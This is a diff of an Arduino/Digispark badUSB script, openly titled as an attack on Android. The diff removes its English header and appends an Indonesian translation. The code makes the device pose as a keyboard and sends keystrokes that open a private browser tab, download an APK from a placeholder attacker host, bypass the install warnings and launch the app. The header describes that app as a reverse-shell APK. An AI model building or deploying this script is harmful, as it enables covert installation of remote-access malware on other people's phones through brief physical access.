@@ -1,21 +1,3 @@
-/*
-
-@title: badUSB attack targeting Android
-
-@author: caioau (caio dot volpato at riseup dot net)
-
-@license: GPLv2
-
-@repo: https://github.com/caioau/badUSB-Targeting-Android
-
-@description: this arduino code will make the Arduino act as a keyboard, 
-then will send some keystrokes to Open the browser, download, install and run a
-apk (read more on the repo on how to generate the reverse shell apk)
-
-*/
-
-
-
 #include "DigiKeyboard.h"
 
 // FIXME: substitute your domain and port here
@@ -23,8 +5,6 @@ apk (read more on the repo on how to generate the reverse shell apk)
 
 // FIXME: substitute your name here
 #define apkLink "/filename.apk"
-
-
 
 void setup() {
   pinMode(1, OUTPUT);
@@ -39,7 +19,6 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_B, MOD_GUI_LEFT); // super + b -> open browser
 
   DigiKeyboard.delay(3000); // wait 3s browser to open
-
 
   DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT); // control +n open new private tab
 
@@ -67,9 +46,7 @@ void loop() {
 
   DigiKeyboard.delay(500);
 
-
   DigiKeyboard.println("\t\t\t\t\t\t"); 
-
 
   DigiKeyboard.delay(2000);
 
@@ -105,7 +82,6 @@ void loop() {
 
   DigiKeyboard.delay(500);
 
-  
   DigiKeyboard.sendKeyPress(0,MOD_GUI_LEFT); 
   DigiKeyboard.sendKeyPress(42,MOD_GUI_LEFT);
   DigiKeyboard.delay(200);
@@ -114,7 +90,6 @@ void loop() {
 
   DigiKeyboard.delay(1000); // back
 
-  
   for(int i=0; i<= 20; i++){
   
      DigiKeyboard.sendKeyStroke(0x51); // key down
@@ -132,7 +107,7 @@ void loop() {
 
   DigiKeyboard.delay(5000);
 
-   DigiKeyboard.sendKeyStroke(0x51); // key down 3 times
+  DigiKeyboard.sendKeyStroke(0x51); // key down 3 times
 
   DigiKeyboard.delay(200);
 
@@ -150,9 +125,9 @@ void loop() {
   
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // hit enter to install anyway
 
-   DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(5000);
 
-   DigiKeyboard.sendKeyStroke(0x51); // key down 3 times
+  DigiKeyboard.sendKeyStroke(0x51); // key down 3 times
 
   DigiKeyboard.delay(200);
 
@@ -170,9 +145,9 @@ void loop() {
   
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // hit enter to dont send the apk  
 
-   DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(5000);
 
-   DigiKeyboard.sendKeyStroke(0x51); // key down 2 times
+  DigiKeyboard.sendKeyStroke(0x51); // key down 2 times
 
   DigiKeyboard.delay(200);
 
@@ -186,7 +161,6 @@ void loop() {
   
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // hit enter to open the installed apk
 
-
   for (;;) {  // keep the led blinking when finished
     digitalWrite(1, LOW);
     delay(500);
@@ -194,3 +168,9 @@ void loop() {
     delay(500);
   }
 }
+
+title: serangan badUSB menargetkan Android
+
+deskripsi: kode arduino ini akan membuat Arduino bertindak sebagai keyboard,
+kemudian akan mengirim beberapa penekanan tombol untuk Buka browser, unduh, instal, dan jalankan
+apk (baca selengkapnya di repo tentang cara menghasilkan apk shell terbalik)
